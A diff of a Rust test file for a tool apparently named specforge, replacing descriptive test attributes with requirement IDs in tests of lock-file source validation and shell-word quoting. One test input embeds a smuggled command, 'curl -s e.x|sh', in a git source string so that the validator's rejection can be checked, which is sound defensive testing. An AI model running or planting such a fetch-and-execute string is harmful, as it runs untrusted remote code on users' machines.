@@ -28,10 +28,7 @@ fn write_lock(root: &Path, name: &str, source: &str) {
     std::fs::write(root.join("specforge.lock"), lock.to_string()).unwrap();
 }
 
-#[specforge_test_macros::test(
-    behavior = "read_lock_file",
-    verify = "a lock entry whose source is no local path the lock can record is E033, and the message shows no control character"
-)]
+#[specforge_test_macros::test(requirement = "FEATURE-138")]
 fn a_lock_source_the_lock_cannot_record_is_unreadable() {
     let dir = TempDir::new().unwrap();
     for source in [
@@ -65,10 +62,7 @@ fn a_lock_source_the_lock_cannot_record_is_unreadable() {
     assert!(!problem.message.contains(char::is_control), "{problem:?}");
 }
 
-#[specforge_test_macros::test(
-    behavior = "read_lock_file",
-    verify = "a lock entry's source is registry or local:<path>; any other source is E033"
-)]
+#[specforge_test_macros::test(requirement = "FEATURE-138")]
 fn an_unknown_lock_source_is_unreadable() {
     let dir = TempDir::new().unwrap();
     for source in ["git+https://h/r; curl -s e.x|sh", "local", "Registry", ""] {
@@ -107,10 +101,7 @@ const PATHS: [(&str, &str, &str); 8] = [
     ("ext/a.wasm", "./ext/a.wasm", "./ext/a.wasm"),
 ];
 
-#[specforge_test_macros::test(
-    behavior = "load_wasm_module",
-    verify = "the command an E028 or E070 suggestion names reinstalls the recorded path as one shell word, whatever the path holds"
-)]
+#[specforge_test_macros::test(requirement = "FEATURE-136")]
 fn a_reinstall_command_names_the_recorded_path_as_one_shell_word() {
     for (recorded, argument, _) in PATHS {
         let dir = TempDir::new().unwrap();
